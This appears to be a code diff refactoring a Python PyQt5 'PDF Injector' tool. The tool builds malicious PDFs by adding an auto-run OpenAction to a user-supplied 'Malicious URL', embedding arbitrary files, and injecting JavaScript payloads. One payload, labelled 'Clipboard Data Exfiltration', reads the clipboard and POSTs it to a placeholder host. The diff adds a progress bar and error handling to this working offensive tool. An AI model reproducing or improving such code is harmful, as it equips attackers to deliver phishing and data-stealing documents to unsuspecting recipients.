@@ -1,25 +1,10 @@
-import sys
 import os
-import PyPDF4
-from PyPDF4.generic import (
-    DictionaryObject,
-    NameObject,
-    TextStringObject,
-    EncodedStreamObject,
-    ArrayObject,
-)
+import sys
+from PyPDF4 import PdfFileReader, PdfFileWriter
+from PyPDF4.generic import DictionaryObject, NameObject, TextStringObject, EncodedStreamObject
 from PyQt5.QtWidgets import (
-    QApplication,
-    QMainWindow,
-    QVBoxLayout,
-    QHBoxLayout,
-    QLabel,
-    QLineEdit,
-    QPushButton,
-    QFileDialog,
-    QWidget,
-    QComboBox,
-    QMessageBox,
+    QApplication, QMainWindow, QVBoxLayout, QLabel, QLineEdit, QPushButton,
+    QFileDialog, QWidget, QComboBox, QMessageBox, QProgressBar
 )
 from PyQt5.QtCore import Qt
 
@@ -37,32 +22,132 @@ js_payloads = {
     "Clipboard Data Exfiltration": "navigator.clipboard.readText().then(function(clipboardText) { var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://your-website.com/clipboard'); xhr.setRequestHeader('Content-Type', 'application/json'); xhr.send(JSON.stringify({ clipboard: clipboardText })); });",
 }
 
-def inject_url(input_pdf, output_pdf, malicious_url):
-    with open(input_pdf, "rb") as file:
-        pdf_reader = PyPDF4.PdfFileReader(file)
-        pdf_writer = PyPDF4.PdfFileWriter()
+class PDFInjector(QMainWindow):
+    def __init__(self):
+        super().__init__()
+        self.setWindowTitle("PDF Injector")
+        self.setGeometry(100, 100, 600, 400)
+        
+        self.layout = QVBoxLayout()
+        self.create_widgets()
+        
+        container = QWidget()
+        container.setLayout(self.layout)
+        self.setCentralWidget(container)
 
+    def create_widgets(self):
+        self.add_label("Input PDF:")
+        self.input_pdf_lineedit = self.add_line_edit()
+        self.add_button("Browse", self.browse_input_pdf)
+
+        self.add_label("Output PDF:")
+        self.output_pdf_lineedit = self.add_line_edit()
+        self.add_button("Browse", self.browse_output_pdf)
+
+        self.add_label("Malicious URL:")
+        self.malicious_url_lineedit = self.add_line_edit()
+
+        self.add_button("Inject URL", self.inject_url)
+
+        self.add_label("File to Inject:")
+        self.file_to_inject_lineedit = self.add_line_edit()
+        self.add_button("Browse", self.browse_file_to_inject)
+
+        self.add_button("Inject File", self.inject_file)
+
+        self.add_label("JavaScript Payload:")
+        self.js_payload_combobox = QComboBox()
+        self.js_payload_combobox.addItems(js_payloads.keys())
+        self.layout.addWidget(self.js_payload_combobox)
+
+        self.add_button("Inject JavaScript", self.inject_js)
+
+        self.progress_bar = QProgressBar(self)
+        self.layout.addWidget(self.progress_bar)
+
+    def add_label(self, text):
+        label = QLabel(text)
+        self.layout.addWidget(label)
+
+    def add_line_edit(self):
+        line_edit = QLineEdit()
+        self.layout.addWidget(line_edit)
+        return line_edit
+
+    def add_button(self, text, slot):
+        button = QPushButton(text)
+        button.clicked.connect(slot)
+        self.layout.addWidget(button)
+
+    def browse_input_pdf(self):
+        self.browse_file("Select Input PDF", self.input_pdf_lineedit)
+
+    def browse_output_pdf(self):
+        self.browse_file("Select Output PDF", self.output_pdf_lineedit, save=True)
+
+    def browse_file_to_inject(self):
+        self.browse_file("Select File to Inject", self.file_to_inject_lineedit)
+
+    def browse_file(self, dialog_title, line_edit, save=False):
+        file_name, _ = (QFileDialog.getSaveFileName if save else QFileDialog.getOpenFileName)(
+            self, dialog_title, "", "PDF Files (*.pdf);;All Files (*)"
+        )
+        if file_name:
+            line_edit.setText(file_name)
+
+    def validate_inputs(self, inputs):
+        if any(not input_field for input_field in inputs):
+            QMessageBox.warning(self, "Input Error", "Please fill in all fields.")
+            return False
+        return True
+
+    def inject_url(self):
+        self.inject_pdf(self._inject_url)
+
+    def inject_file(self):
+        self.inject_pdf(self._inject_file)
+
+    def inject_js(self):
+        input_pdf = self.input_pdf_lineedit.text()
+        output_pdf = self.output_pdf_lineedit.text()
+        js_payload = js_payloads.get(self.js_payload_combobox.currentText())
+        self.progress_bar.setValue(0)
+
+        if not self.validate_inputs([input_pdf, output_pdf]) or not js_payload:
+            QMessageBox.warning(self, "Input Error", "Please select a valid JavaScript payload.")
+            return
+
+        try:
+            with open(input_pdf, "rb") as file:
+                pdf_reader = PdfFileReader(file)
+                pdf_writer = PdfFileWriter()
+
+                for i in range(len(pdf_reader.pages)):
+                    pdf_writer.addPage(pdf_reader.pages[i])
+                    self.progress_bar.setValue((i + 1) / len(pdf_reader.pages) * 100)
+
+                # Add JavaScript to the PDF
+                pdf_writer.addJS(js_payload)
+
+                with open(output_pdf, "wb") as output_file:
+                    pdf_writer.write(output_file)
+
+            QMessageBox.information(self, "Success", "JavaScript injected successfully!")
+        except Exception as e:
+            self.show_error_message("An error occurred while injecting JavaScript.", e)
+
+    def _inject_url(self, pdf_reader, pdf_writer, *args):
+        malicious_url = self.malicious_url_lineedit.text()
         open_action = DictionaryObject({
             NameObject("/Type"): NameObject("/Action"),
             NameObject("/S"): NameObject("/URI"),
             NameObject("/URI"): TextStringObject(malicious_url)
         })
 
-        for i in range(len(pdf_reader.pages)):
-            pdf_writer.addPage(pdf_reader.pages[i])
-
         pdf_writer._root_object.update({NameObject("/OpenAction"): open_action})
 
-        with open(output_pdf, "wb") as output_file:
-            pdf_writer.write(output_file)
-
-def inject_file(input_pdf, output_pdf, file_to_inject):
-    with open(input_pdf, "rb") as file:
-        pdf_reader = PyPDF4.PdfFileReader(file)
-        pdf_writer = PyPDF4.PdfFileWriter()
-
-        for i in range(len(pdf_reader.pages)):
-            pdf_writer.addPage(pdf_reader.pages[i])
+    def _inject_file(self, pdf_reader, pdf_writer, *args):
+        file_to_inject = self.file_to_inject_lineedit.text()
 
         with open(file_to_inject, "rb") as file_inject:
             file_data = file_inject.read()
@@ -85,107 +170,34 @@ def inject_file(input_pdf, output_pdf, file_to_inject):
         })
         pdf_writer._addObject(filespec)
 
-        with open(output_pdf, "wb") as output_file:
-            pdf_writer.write(output_file)
-
-def inject_js(input_pdf, output_pdf, js_code):
-    with open(input_pdf, "rb") as file:
-        pdf_reader = PyPDF4.PdfFileReader(file)
-        pdf_writer = PyPDF4.PdfFileWriter()
-
-        for i in range(len(pdf_reader.pages)):
-            pdf_writer.addPage(pdf_reader.pages[i])
-
-        js_action = DictionaryObject({
-            NameObject("/Type"): NameObject("/Action"),
-            NameObject("/S"): NameObject("/JavaScript"),
-            NameObject("/JS"): TextStringObject(js_code)
-        })
-
-        pdf_writer._root_object.update({NameObject("/OpenAction"): js_action})
-
-        with open(output_pdf, "wb") as output_file:
-            pdf_writer.write(output_file)
-
-class PDFInjector(QMainWindow):
-    def __init__(self):
-        super().__init__()
-
-        self.setWindowTitle("PDF Injector")
-        self.setGeometry(100, 100, 400, 300)
-
-        self.layout = QVBoxLayout()
-
-        self.input_pdf_label = QLabel("Input PDF:")
-        self.layout.addWidget(self.input_pdf_label)
-
-        self.input_pdf_lineedit = QLineEdit()
-        self.layout.addWidget(self.input_pdf_lineedit)
-
-        self.output_pdf_label = QLabel("Output PDF:")
-        self.layout.addWidget(self.output_pdf_label)
-
-        self.output_pdf_lineedit = QLineEdit()
-        self.layout.addWidget(self.output_pdf_lineedit)
-
-        self.malicious_url_label = QLabel("Malicious URL:")
-        self.layout.addWidget(self.malicious_url_label)
-
-        self.malicious_url_lineedit = QLineEdit()
-        self.layout.addWidget(self.malicious_url_lineedit)
-
-        self.inject_url_button = QPushButton("Inject URL")
-        self.inject_url_button.clicked.connect(self.inject_url)
-        self.layout.addWidget(self.inject_url_button)
-
-        self.file_to_inject_label = QLabel("File to Inject:")
-        self.layout.addWidget(self.file_to_inject_label)
-
-        self.file_to_inject_lineedit = QLineEdit()
-        self.layout.addWidget(self.file_to_inject_lineedit)
-
-        self.inject_file_button = QPushButton("Inject File")
-        self.inject_file_button.clicked.connect(self.inject_file)
-        self.layout.addWidget(self.inject_file_button)
-
-        self.js_payload_label = QLabel("JavaScript Payload:")
-        self.layout.addWidget(self.js_payload_label)
-
-        self.js_payload_combobox = QComboBox()
-        self.js_payload_combobox.addItems(js_payloads.keys())
-        self.layout.addWidget(self.js_payload_combobox)
-
-        self.inject_js_button = QPushButton("Inject JavaScript")
-        self.inject_js_button.clicked.connect(self.inject_js)
-        self.layout.addWidget(self.inject_js_button)
-
-        container = QWidget()
-        container.setLayout(self.layout)
-        self.setCentralWidget(container)
-
-    def inject_url(self):
+    def inject_pdf(self, inject_function):
         input_pdf = self.input_pdf_lineedit.text()
         output_pdf = self.output_pdf_lineedit.text()
-        malicious_url = self.malicious_url_lineedit.text()
+        self.progress_bar.setValue(0)
 
-        inject_url(input_pdf, output_pdf, malicious_url)
-        QMessageBox.information(self, "Success", "Malicious URL injected successfully!")
+        if not self.validate_inputs([input_pdf, output_pdf]):
+            return
 
-    def inject_file(self):
-        input_pdf = self.input_pdf_lineedit.text()
-        output_pdf = self.output_pdf_lineedit.text()
-        file_to_inject = self.file_to_inject_lineedit.text()
+        try:
+            with open(input_pdf, "rb") as file:
+                pdf_reader = PdfFileReader(file)
+                pdf_writer = PdfFileWriter()
 
-        inject_file(input_pdf, output_pdf, file_to_inject)
-        QMessageBox.information(self, "Success", "File injected successfully!")
+                for i in range(len(pdf_reader.pages)):
+                    pdf_writer.addPage(pdf_reader.pages[i])
+                    self.progress_bar.setValue((i + 1) / len(pdf_reader.pages) * 100)
 
-    def inject_js(self):
-        input_pdf = self.input_pdf_lineedit.text()
-        output_pdf = self.output_pdf_lineedit.text()
-        js_code = js_payloads[self.js_payload_combobox.currentText()]
+                inject_function(pdf_reader, pdf_writer)
 
-        inject_js(input_pdf, output_pdf, js_code)
-        QMessageBox.information(self, "Success", "JavaScript injected successfully!")
+                with open(output_pdf, "wb") as output_file:
+                    pdf_writer.write(output_file)
+
+            QMessageBox.information(self, "Success", "PDF injected successfully!")
+        except Exception as e:
+            self.show_error_message("An error occurred while injecting the PDF.", e)
+
+    def show_error_message(self, message, exception):
+        QMessageBox.critical(self, "Error", f"{message}\nDetails: {exception}")
 
 if __name__ == "__main__":
     app = QApplication(sys.argv)
